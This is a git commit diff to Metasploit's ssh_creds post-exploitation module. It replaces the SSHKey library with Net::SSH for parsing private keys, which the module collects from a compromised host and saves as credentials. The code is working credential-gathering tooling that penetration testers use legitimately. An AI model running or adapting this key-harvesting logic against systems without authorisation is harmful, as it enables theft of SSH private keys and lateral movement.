2444d2c8db61d01de2a3e841fbf5f48498826abb
g0t mi1k <have.you.g0tmi1k@gmail.com>
2026-05-14 14:33:26 +0100

    ssh_creds: Replace SSHKey with Net::SSH

--- modules/post/multi/gather/ssh_creds.rb
+++ modules/post/multi/gather/ssh_creds.rb
@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'sshkey'
+require 'net/ssh'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -101,26 +101,36 @@ class MetasploitModule < Msf::Post
         print_good("Downloaded: #{file_path} -> #{loot_path}")
 
         # store only ssh private keys
-        next if SSHKey.valid_ssh_public_key? data
-
-        begin
-          key = SSHKey.new(data, passphrase: '')
-
-          credential_data = {
-            origin_type: :session,
-            session_id: session_db_id,
-            post_reference_name: refname,
-            private_type: :ssh_key,
-            private_data: key.key_object.to_s,
-            username: user,
-            workspace_id: myworkspace_id
-          }
-
-          create_credential(credential_data)
-        rescue OpenSSL::OpenSSLError => e
-          print_error("Could not load SSH Key: #{e.message}")
-        end
+        store_ssh_key(data, user, file)
       end
+    end
+  end
+
+  def store_ssh_key(data, user, filename)
+    return unless data.to_s.include?('PRIVATE KEY')
+
+    begin
+      Net::SSH::KeyFactory.load_data_private_key(data, nil, false)
+
+      create_credential(
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        private_type: :ssh_key,
+        private_data: data,
+        username: user,
+        workspace_id: myworkspace_id,
+        address: session.session_host,
+        port: 22,
+        service_name: 'ssh',
+        protocol: 'tcp'
+      )
+
+      print_good("Stored SSH private key (#{filename}) for user: #{user}")
+    rescue Net::SSH::KeyFactory::KeyManagerError
+      print_warning("SSH private key (#{filename}) is passphrase-protected - stored as loot but not parsed")
+    rescue StandardError => e
+      print_warning("Could not parse SSH private key in #{filename}: #{e.message}")
     end
   end
 end
